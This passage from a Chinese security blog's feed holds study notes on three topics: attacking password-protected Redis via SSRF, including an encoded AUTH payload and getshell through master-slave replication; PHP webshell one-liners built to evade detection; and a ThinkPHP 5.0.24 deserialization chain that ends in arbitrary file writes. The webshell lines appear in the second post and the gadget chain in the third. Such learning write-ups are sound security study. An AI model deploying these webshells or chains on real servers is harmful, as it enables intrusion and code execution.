<p>写<code>crontab</code>的时候，一定要注意，不一定所有系统都包含crontab服务</p>
<h2 id="攻击带有密码的redis">攻击带有密码的redis</h2>
<blockquote>
<p>近期在看redis未授权，大部分提到的都是ssrf + 授权的redis， 即用<code>gopher://</code>协议进行攻击。那么如果内网redis带有密码或者别的认证的情况下呢？找到了相关文章学习了一下</p>
</blockquote>
<p>这篇<a href="https://zhuanlan.zhihu.com/p/74324307">文章</a>提及到了如何攻击带有密码的redis</p>
<h3 id="前提知识">前提知识</h3>
<p>Redis服务器与客户端通过RESP（REdis Serialization Protocol）协议通信。RESP协议-简书这边文章简单地描述了该协议的格式，在ssrf的时候我们要将payload转化为这一种类型格式</p>
<h3 id="具体细节">具体细节</h3>
<p>其实读完上述文章后了解到后续写shell的地方都是差不多的，只是前面的内容有所不同。之前复习gopher写shell的时候其实已经了解到，redis可以一次性写入多条语句执行，最后读取执行结果。</p>
<p>那么认证的redis本质上只是多了前面判断认证的过程，具体为<code>%2A2%0d%0a%244%0d%0aAUTH%0d%0a%246%0d%0a123123%0D%0A</code></p>
<h3 id="认为不对的地方">认为不对的地方</h3>
<p>在观察这些<code>payload</code>的时候，都会发现一个问题，就是他们都包含了<code>flushall</code>这个操作。如果是在实际环境进行测试，我认为<code>flushall</code>应该不妥吧...</p>
<h2 id="知识扩展">知识扩展</h2>
<p>对于写redis shell，看文章最常见的就是gopher协议，那么如果gopher协议被禁用呢</p>
<p>找到<a href="https://www.cnblogs.com/-chenxs/p/11749367.html">参考文章</a>，继续探索</p>
<h3 id="其他方法">其他方法</h3>
<h4 id="header-crlf注入">header CRLF注入</h4>
<p>这个攻击方式较为少见，比较适用于weblogic的SSRF攻击</p>
<h4 id="dict协议">dict协议</h4>
<h2 id="主从复制">主从复制</h2>
<h3 id="前置知识">前置知识</h3>
<h4 id="什么是主从复制">什么是主从复制</h4>
<p>当Redis是单个实例的时候，当读写量较大时服务器难以承受。主从模式即指定一个redis实例作为主机，其他都是备份机，从机只负责读，主机只负责写来分担压力</p>
<h4 id="主从复制getshell优点">主从复制getshell优点</h4>
<p>主从复制Getshell有什么优点：现在容器化、组件化不断发展，导致在容器内往往只有一个服务，那么通过写webshell，crontab，ssh等getshell的操作会越来越难，而主从复制漏洞不依赖其他服务，直接getshell</p>
<h4 id="redis模块">redis模块</h4>
<p>redis4.x之后，新增了模块功能，通过外部扩展，可以在redis中实现一个新的redis命令。redis模块实际是一个动态库，他能够让redis-cli使用module load把他加载到redis内核</p>
<h4 id="payload">payload</h4>
<p>https://github.com/LoRexxar/redis-rogue-server</p>
<p>另一<a href="https://www.t00ls.net/articles-56339.html">好文</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[PHP后门&特性记录]]></title>
        <id>https://chriskalix.github.io/post/php-hou-men-andte-xing-ji-lu/</id>
        <link href="https://chriskalix.github.io/post/php-hou-men-andte-xing-ji-lu/">
        </link>
        <updated>2020-06-14T04:24:32.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>这两天读了P牛的文章，正好群里的大佬发出了文章用到了Tricks。由于php审计还处于不成熟阶段，记录一下读后感受</p>
</blockquote>
<h2 id="php的特性检测">PHP的特性&amp;检测</h2>
<p>通常的，常见的php webshell很容易被吃。前段时间处理网站被挂马，马都比较明显，要么是混淆要么是回调，这种往往是因为没有前置一个较好的webshell检测，有的话这么简单的马应该是传不上来的。<br>
这时我问我自己，如果是我来上传马，我会怎么做？我发现我的想法也比较局限，无非就是正则执行，回调，加密混淆等等😅。此时看到P牛的文章，感觉十分神奇，记录一下</p>
<h2 id="前置知识">前置知识</h2>
<p>文章中提到了针对一个回调型后门，检测引擎会如何检测：</p>
<ol>
<li>遍历AST树</li>
<li>分析<code>FuncCall Node</code>判断是否有回调</li>
<li>回调是否是一个变量</li>
</ol>
<h2 id="函数别名">函数别名</h2>
<p>我能想到的正则执行，在PHP7后已经被删除了。mb_ereg_replace和mb_eregi_replace这两个函数依然可以，他们的别名mbereg_replace和mbereg_ireplace也能执行任意代码。P牛演示的代码段为</p>
<pre><code class="language-php">&lt;?php
mbereg_replace('.*', '\0', $_REQUEST[2333], 'mer');
</code></pre>
<p>在PHP7.2.9的环境中报错，切换到低版本后没有问题了<br>
上述的是一个引子，通用的方法是自己来申明函数的别名，例如</p>
<pre><code class="language-php">&lt;?php
use function \assert as test;
test($_POST[2333]);
</code></pre>
<p>以及PHP7的</p>
<pre><code class="language-php">&lt;?php
$f = new class($_POST['name']) extends ReflectionFunction {};
$f-&gt;invoke($_POST[2333]);
</code></pre>
<p><strong>神奇的trick</strong></p>
<pre><code class="language-php">printf&lt;char&gt;('hello world')
</code></pre>
<p>其中<char>的范围是[\x00-\x20],PHP会忽略这个控制字符，也是一个绕过的tricks（PHP-Parser是无法正确解析的）</p>
<h2 id="文章总结">文章总结</h2>
<ol>
<li>别名</li>
<li>重命名</li>
<li>参数名位置(变长参数)</li>
<li>控制字符(重点)</li>
<li>PHP标签</li>
</ol>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Thinkphp 5.0.24 反序列化链分析]]></title>
        <id>https://chriskalix.github.io/post/thinkphp-5024-fan-xu-lie-hua-lian-fen-xi/</id>
        <link href="https://chriskalix.github.io/post/thinkphp-5024-fan-xu-lie-hua-lian-fen-xi/">
        </link>
        <updated>2020-06-14T04:13:42.000Z</updated>
        <content type="html"><![CDATA[<h2 id="具体分析">具体分析</h2>
<blockquote>
<p>这里非常的长，比较复杂，推荐两个文章<br>
https://www.anquanke.com/post/id/196364#h2-5<br>
http://althims.com/2020/02/07/thinkphp-5-0-24-unserialize/<br>
这里主要是记录一下我跟着其他作者的文章分析的流程</p>
</blockquote>
<h3 id="入口点">入口点</h3>
<p>首先找到 <code>__destruct</code> 选择<code>/thinkphp/library/think/process/pipes/Windows.php</code>下的，代码如下</p>
<pre><code class="language-php">public function __destruct()
{
    $this-&gt;close();
    $this-&gt;removeFiles();
}
</code></pre>
<p>跟进<code>removeFiles()</code></p>
<pre><code class="language-php">private function removeFiles()
{
    foreach ($this-&gt;files as $filename) {
        if (file_exists($filename)) {
            @unlink($filename);
        }
    }
    $this-&gt;files = [];
}
</code></pre>
<p>这边的<code>$files</code>可控，通过向<code>file_exists</code>任意类来触发<code>__toString()</code>，那么继续跟进寻找，在<code>/thinkphp/library/think/Model.php</code>中找到</p>
<pre><code class="language-php">public function __toString() // 全局搜索__toString，找到这里，继续跟进
{
    return $this-&gt;toJson();
}
</code></pre>
<pre><code class="language-php">public function toJson($options = JSON_UNESCAPED_UNICODE) // 调用toArray，继续跟进
{
    return json_encode($this-&gt;toArray(), $options);
}
</code></pre>
<p>调用了<code>toArray()</code>，继续跟进，这边函数太长，提取出关键字段</p>
<h3 id="分析难点">分析难点</h3>
<p>这边分析是一个转折点，有几次赋值和方法，跟着别的作者文章看的时候觉得这里比较复杂</p>
<pre><code class="language-php">public function toArray() // toArray这里是难点，仔细分析，因为我们的最终目的是执行__call，所以找到三处疑似利用点
{
    $item    = [];
    $visible = [];
    $hidden  = [];
    ...
    if (!empty($this-&gt;append)) {    // [*] 一: append不能为空 (这里append是可控的)
        foreach ($this-&gt;append as $key =&gt; $name) {
            if (is_array($name)) {  // [*] 二: $name是否是array (显然也是可控)
                $relation   = $this-&gt;getAttr($key);
                $item[$key] = $relation-&gt;append($name)-&gt;toArray();
            } elseif (strpos($name, '.')) { // [*] 三: $name中是否包含 . ，包含的话进到这个循环
                list($key, $attr) = explode('.', $name);
                $relation   = $this-&gt;getAttr($key);
                /** 第一处 **/
                $item[$key] = $relation-&gt;append([$attr])-&gt;toArray();
            } else {
                $relation = Loader::parseName($name, 1, false); // $name可控，跟进函数(只是修改函数命名)
                if (method_exists($this, $relation)) {          // [*] 四: 判断该方法是否存在于类中
                    $modelRelation = $this-&gt;$relation(); // 调用该方法并赋值$modelRelation (这边找到的是getError函数)
                    $value         = $this-&gt;getRelationData($modelRelation); //跟进getRelationData -&gt; 639行

                    if (method_exists($modelRelation, 'getBindAttr')) { // [*] 五: 满足返回的函数存在getBindAttr
                        /** 第二处 **/
                        $bindAttr = $modelRelation-&gt;getBindAttr();
                        if ($bindAttr) {                           // [*] 六: 值存在则继续
                            foreach ($bindAttr as $key =&gt; $attr) {
                                $key = is_numeric($key) ? $attr : $key;
                                if (isset($this-&gt;data[$key])) {
                                    throw new Exception('bind attr has exists:' . $key);
                                } else {    // [*] 七: this-&gt;data[$key]没有赋值
                                    /** 第三处 **/
                                    $item[$key] = $value ? $value-&gt;getAttr($attr) : null;
                                }
                            }
                            continue;
                        }
                    }
                    $item[$name] = $value;
                } else {
                    $item[$name] = $this-&gt;getAttr($name);
                }
            }
        }
    }
    return !empty($item) ? $item : [];
}
</code></pre>
<p>这里选用第三处作为跳转点，看到判断点四下有两个赋值操作</p>
<pre><code class="language-php">$modelRelation = $this-&gt;$relation(); // 调用该方法并赋值$modelRelation (这边找到的是getError函数)
$value         = $this-&gt;getRelationData($modelRelation); // 跟进getRelationData -&gt; 639行
</code></pre>
<p>这里的<code>$relation</code>是可控的，在<code>Model.php</code>下可控的函数选择 <code>getError</code></p>
<pre><code class="language-php">public function getError()
{
    return $this-&gt;error; // 这里的error是可以控制的，所以选择这里
}
</code></pre>
<p>然后跟进<code>$value=$this-&gt;getRelationData($modelRelation);</code></p>
<pre><code class="language-php">protected function getRelationData(Relation $modelRelation)
{
    if ($this-&gt;parent &amp;&amp; !$modelRelation-&gt;isSelfRelation() &amp;&amp; get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)) {
        $value = $this-&gt;parent;
    } else {
        // 首先获取关联数据
        if (method_exists($modelRelation, 'getRelation')) {
            $value = $modelRelation-&gt;getRelation();
        } else {
            throw new BadMethodCallException('method not exists:' . get_class($modelRelation) . '-&gt; getRelation');
        }
    }
    return $value;
}
</code></pre>
<p>首先要满足穿来的<code>$modelRelation</code>是Relation类，全局查找getRelation方法且为Relation类的类，找到 <code>HasOne``(/thinkphp/library/think/model/relation/HasOne.php)</code></p>
<pre><code class="language-php">public function getRelation($subRelation = '', $closure = null)
{
    // 执行关联定义方法
    $localKey = $this-&gt;localKey;
    if ($closure) {
        call_user_func_array($closure, [ &amp; $this-&gt;query]);
    }
    // 判断关联类型执行查询
    $relationModel = $this-&gt;query
        -&gt;removeWhereField($this-&gt;foreignKey)
        -&gt;where($this-&gt;foreignKey, $this-&gt;parent-&gt;$localKey)
        -&gt;relation($subRelation)
        -&gt;find();

    if ($relationModel) {
        $relationModel-&gt;setParent(clone $this-&gt;parent);
    }

    return $relationModel;
}
</code></pre>
<p>可以看到满足条件，那么回到<code>Model.php</code>中继续跟进到第三处，执行到<code>Output.php</code>的__call函数，调用了block，跟进block</p>
<pre><code class="language-php">protected function block($style, $message)
{
    $this-&gt;writeln(&quot;&lt;{$style}&gt;{$message}&lt;/$style&gt;&quot;);
}
</code></pre>
<pre><code class="language-php">public function writeln($messages, $type = self::OUTPUT_NORMAL)
{
    $this-&gt;write($messages, true, $type);
}
</code></pre>
<pre><code class="language-php">public function write($messages, $newline = false, $type = self::OUTPUT_NORMAL)
{
    $this-&gt;handle-&gt;write($messages, $newline, $type);
}
</code></pre>
<p>handle可控，看看有没有别的write，<code>/thinkphp/library/think/session/driver/Memcached.php</code>中有</p>
<pre><code class="language-php">public function write($sessID, $sessData)
{
    return $this-&gt;handler-&gt;set($this-&gt;config['session_name'] . $sessID, $sessData, $this-&gt;config['expire']);
}
</code></pre>
<p>跟到了set跳板，全局找到<code>/thinkphp/library/think/cache/driver/File.php</code>下的set</p>
<pre><code class="language-php">public function set($name, $value, $expire = null) // 跟到set
{
    if (is_null($expire)) {
        $expire = $this-&gt;options['expire'];
    }
    if ($expire instanceof \DateTime) {
        $expire = $expire-&gt;getTimestamp() - time();
    }
    $filename = $this-&gt;getCacheKey($name, true); // name可控，继续跟进
    if ($this-&gt;tag &amp;&amp; !is_file($filename)) {
        $first = true;
    }
    $data = serialize($value);
    if ($this-&gt;options['data_compress'] &amp;&amp; function_exists('gzcompress')) {
        //数据压缩
        $data = gzcompress($data, 3);
    }
    $data   = &quot;&lt; ?php\n//&quot; . sprintf('%012d', $expire) . &quot;\n exit();?&gt;\n&quot; . $data;
    $result = file_put_contents($filename, $data);
    if ($result) {
        isset($first) &amp;&amp; $this-&gt;setTagItem($filename);
        clearstatcache();
        return true;
    } else {
        return false;
    }
}
</code></pre>
<p>这里写入函数file_put_contents的$filename由getCacheKey来，跟进看</p>
<pre><code class="language-php">protected function getCacheKey($name, $auto = false)
{
    $name = md5($name);
    if ($this-&gt;options['cache_subdir']) {
        // 使用子目录
        $name = substr($name, 0, 2) . DS . substr($name, 2);
    }
    if ($this-&gt;options['prefix']) {
        $name = $this-&gt;options['prefix'] . DS . $name;
    }
    $filename = $this-&gt;options['path'] . $name . '.php';//用协议
    $dir      = dirname($filename);

    if ($auto &amp;&amp; !is_dir($dir)) {
        mkdir($dir, 0755, true);
    }
    return $filename;
}
</code></pre>
<p>options是可控的，继续回去看<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mi>a</mi><mi>t</mi><mi>a</mi><mi mathvariant="normal">与</mi></mrow><annotation encoding="application/x-tex">data与</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord cjk_fallback">与</span></span></span></span>value有关</p>
<pre><code class="language-php">$data = serialize($value);
...
$data   = &quot;&lt;?php\n//&quot; . sprintf('%012d', $expire) . &quot;\n exit();?&gt;\n&quot; . $data;
</code></pre>
<p>这里的$value进来是true，所以这里不可控，但是写完后会调用setTagItem，这里在<code>Driver.php</code>里</p>
<pre><code class="language-php">protected function setTagItem($name)
{
    if ($this-&gt;tag) {
        $key       = 'tag_' . md5($this-&gt;tag);
        $this-&gt;tag = null;
        if ($this-&gt;has($key)) {
            $value   = explode(',', $this-&gt;get($key));
            $value[] = $name;
            $value   = implode(',', array_unique($value));
        } else {
            $value = $name;
        }
        $this-&gt;set($key, $value, 0); //再次调用set
    }
}
</code></pre>
<p>可以看到这里的值都是可控的，再调用了set，所以可以成功的写入文件</p>
<h2 id="总结">总结</h2>
<ol>
<li>windows下写poc的tips1，（感谢osword小刀师傅），写入&lt;?exp.php，相当于exp.php，另外一个https://xz.aliyun.com/t/7310。自行更改后即可~</li>
<li>要找一个有写入权限的目录</li>
</ol>
]]></content>
    </entry>
</feed>